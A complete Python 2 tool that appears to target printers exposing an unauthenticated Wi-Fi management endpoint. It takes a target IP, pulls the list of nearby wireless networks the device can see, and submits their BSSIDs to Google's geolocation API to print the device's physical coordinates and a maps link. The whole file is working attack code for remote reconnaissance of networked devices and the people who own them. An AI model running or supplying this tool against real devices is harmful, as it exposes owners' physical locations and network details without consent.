#!/usr/bin/python
import urllib2
import sys, binascii
import re
import json

# References:  
#    https://developers.google.com/maps/documentation/business/geolocation/


# CHANGE THIS to your Google API key, it takes about 5 minutes to get a free one
# See the URL above for instructions

googleAPIKey    = 'no-google-api-key'

printerWiFiurl = '/IoMgmt/Adapters/Wifi0/WifiNetworks'


try:
  host = str(sys.argv[1])

except: 
  print 'Please specifiy a target IP address..'
  sys.exit(1)
  


print '\r\nQuerying %s for wireless networks...\r\n' % host
url  = 'https://' + host  + printerWiFiurl
req  = urllib2.Request(url)

  
try:
  response = urllib2.urlopen(req)
  networks = response.read()

except urllib2.HTTPError, error:
  print "\r\nERROR: Error communicating with the target - %s %s" % (error.code,error.reason)
  exit()

except urllib2.URLError, error:
  print "\r\nERROR: Error communicating with the target - %s" % (error.reason)
  print "Attempting non-SSL connection..."

  try:
    url = 'http://' + host  + printerWiFiurl
    req  = urllib2.Request(url)
    response = urllib2.urlopen(req)
    networks = response.read()
  except urllib2.HTTPError, error:
    print "\r\nERROR: Error communicating with the target - %s %s" % (error.code,error.reason)
    exit()

  except urllib2.URLError, error:
    print "\r\nERROR: Error communicating with the target - %s" % (error.reason)
    exit()




####
# Process network list
   
pattern = re.compile('<wifi:SSID>([a-fA-F0-9]+)</wifi:SSID>.+?<wifi:BSSID>([a-fA-F0-9]{12})</wifi:BSSID>.+?<wifi:Channel>([0-9]{1,2})</wifi:Channel>.+?<wifi:dBm>([\-]?[0-9]{0,3})</wifi:dBm>',flags=re.DOTALL)

jsonPayload = ''
humanTable = []
networkCount = 0

for (ssid,bssid,channel,dbm) in re.findall(pattern,networks):
  networkCount += 1
  # Reformat bare BSSID string into typical MAC address format
  bssid = ':'.join(s.encode('hex') for s in bssid.decode('hex'))
  jsonPayload += "  " + json.dumps({ "macAddress" : bssid, "signalStrength" : dbm, "channel" : channel, "age" : 0 } ) + ",\r\n"
  
  humanTable.append ( [binascii.unhexlify(ssid),bssid,channel,dbm] )


# Output a human readable table of the wireless networks that the target can see
print "The remote target is aware of %i wireless networks...\r\n" % networkCount

table_headers = ["SSID","BSSID","Channel","Strength"]

row_format ="{:<24}{:<20}{:>10}{:>10}"
print row_format.format(*table_headers)
for row in humanTable:
  print row_format.format(*row)



####
# Send the request to Google

# Finish building the JSON payload that will be sent to Google
jsonPayload = jsonPayload.rstrip(",\r\n") + "\r\n"
jsonPayload = "{\r\n  \"wifiAccessPoints\" : [\r\n " + jsonPayload + "\r\n]\r\n}"


uri     = 'https://www.googleapis.com/geolocation/v1/geolocate?key=' + googleAPIKey
headers = {'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko)', 'Content-Type' : 'application/json' }


print "\r\nSending location query to Google..."
req = urllib2.Request(uri, jsonPayload, headers)

try:
  response = urllib2.urlopen(req) 
  locationData = response.read()

except urllib2.HTTPError, error:
  responseBody = error.read()
  if error.code == 400 and "keyInvalid" in responseBody:
    print "\r\nERROR: It appears that your Google API key is invalid"
  else:
    print "\r\nERROR: Error communicating with the GoogleAPI service - %s %s" % (error.code,error.reason)
  exit()



match = re.match( '.+?"lat":[\s]?([\d.]+).+?"lng":[\s]?([\-\d.]+)[\s]+}.+?"accuracy":[\s]?([\-\d.]+)', locationData,re.S)


if match:
  latitude  = match.group(1)
  longitude = match.group(2)
  accuracy  = match.group(3)

  print "Google indicates that the target is within %s meters of %s,%s" %  (accuracy,latitude,longitude)
  print "Google Maps URL: https://maps.google.com/?q=%s,%s\r\n" % (latitude,longitude)


else:
  print "\r\nERROR: Unable to parse Google gelocation response.  The raw data is:"
  print locationData

exit(0)
